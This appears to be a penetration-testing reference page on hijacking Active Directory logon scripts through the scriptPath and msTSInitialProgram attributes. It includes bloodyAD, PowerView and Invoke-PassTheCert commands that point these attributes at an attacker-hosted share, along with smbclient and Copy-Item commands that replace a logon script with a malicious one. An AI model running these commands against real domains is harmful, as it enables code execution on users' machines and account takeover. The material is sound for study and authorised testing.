---
authors: CravateRouge, ShutdownRepo, jamarir, PvUL00
category: ad
---

# Logon script

## Theory

In Active Directory environments, logon scripts automate tasks at user login (drive mapping, environment customization, etc.). They can be assigned via the `scriptPath` attribute (set through the Logon script field in a user's Profile tab in ADUC) or via Group Policy.

### The scriptPath Attribute

Defined in [MS-ADA3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), [scriptPath](https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath) supports batch (`*.bat`, `*.cmd`), executables (`*.exe`), and Windows Script Host languages (VBScript, JScript, KiXtart), but not PowerShell directly (though PowerShell can be invoked from batch or VBScript).

Windows stores logon scripts in the SYSVOL share (physical location: `%systemroot%\SYSVOL\sysvol`), replicated across all domain controllers. NETLOGON is a separate share that maps to the same physical path (`%systemroot%\SYSVOL\sysvol\<DOMAIN_DNS_NAME>\scripts\`). The `LOGONSERVER` environment variable (NetBIOS name of the authenticating DC) can help locate both shares.

Group Policy-based logon scripts (Modern logon scripts), configured at `User Configuration > Windows Settings > Scripts (Logon/Logoff) > Logon`, additionally support PowerShell.

### Abusing scriptPath

**Write scriptPath**: write access to `scriptPath` allows setting a custom exploit script as the user's logon script. If the script is hosted in NETLOGON/SYSVOL (or via a relative path resolved there), write access to that share is required. If `scriptPath` points to another UNC location, write access to that referenced location is sufficient instead.

**Read scriptPath**: read access (default for domain users) reveals the file `scriptPath` points to. If write permissions exist on that file, the same attacks apply without needing write access to `scriptPath` or NETLOGON. This is especially useful with "stub" logon scripts, where `scriptPath` references a file on another share where domain users may have write access.

## Practice

> [!NOTE]
> It is worth noting that during lab testing, I couldn't find a way to practice this scenario. Since I didn't find practical enough resources on the Internet, feel free to reach out if you manage to exploit this.

This abuse can be carried out when controlling an object that has a `GenericAll` or `GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath` or `msTSInitialProgram`).

The attacker can make the user execute a custom script at logon.

::: tabs


=== UNIX-like

This can be achieved with [bloodyAD](https://github.com/CravateRouge/bloodyAD).
```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'

# or
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
```


=== Windows

This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```powershell

Set-DomainObject testuser -Set @{'msTSInitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose

Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
```

The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell).

> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
```powershell
# Import the PowerShell script and show its manual
Import-Module .\Invoke-PassTheCert.ps1
.\Invoke-PassTheCert.ps1 -?
# Authenticate to LDAP/S
$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
# List all the available actions
Invoke-PassTheCert -a -NoBanner

# Overwrite the values of the 'msTSInitialProgram' and 'scriptPath' attributes for 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSInitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'scriptPath' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
```

:::

### Logon script hijacking via scriptPath

Without `WriteProperty` on `scriptPath`, reading its value (default for domain users) reveals the file it references. If that file is writable, it can be modified directly to achieve the same outcome.

> [!NOTE]
> This technique requires write access on the file referenced by `scriptPath`, identified through prior enumeration.

::: tabs

=== UNIX-like

This can be achieved with [bloodyAD](https://github.com/CravateRouge/bloodyAD), `smbcacls` and `smbclient` (Samba suite).

Read the `scriptPath` attribute value, check file permissions on the referenced share, then overwrite the file if write access is confirmed.

```bash
# Read the scriptPath value
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_USER" --attr scriptPath

# Check ACLs on the referenced file
smbcacls "//$DC_IP/$SHARE" "$LOGON_SCRIPT_DIR/script.bat" -U "$DOMAIN"/"$USER"%"$PASSWORD"

# Back up the original file, then overwrite it with a malicious payload if write access is confirmed
smbclient "//$DC_IP/$SHARE" --directory "$LOGON_SCRIPT_DIR" -U "$DOMAIN"/"$USER"%"$PASSWORD" -c "get script.bat script.bat.bak; put malicious.bat script.bat"
```

=== Windows

This can be achieved with [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module) and `icacls`.

```powershell
# Read the scriptPath value
Get-DomainUser $TARGET_USER -Properties scriptPath

# Check write permissions on the referenced file
icacls "\\$DC_HOST\$SHARE\path\to\script.bat"

# Back up the original file, then overwrite it with a malicious payload if write access is confirmed
Copy-Item "\\$DC_HOST\$SHARE\path\to\script.bat" "\\$DC_HOST\$SHARE\path\to\script.bat.bak"
Copy-Item malicious.bat "\\$DC_HOST\$SHARE\path\to\script.bat" -Force
```

:::

## Resources

[https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)

[https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath](https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath)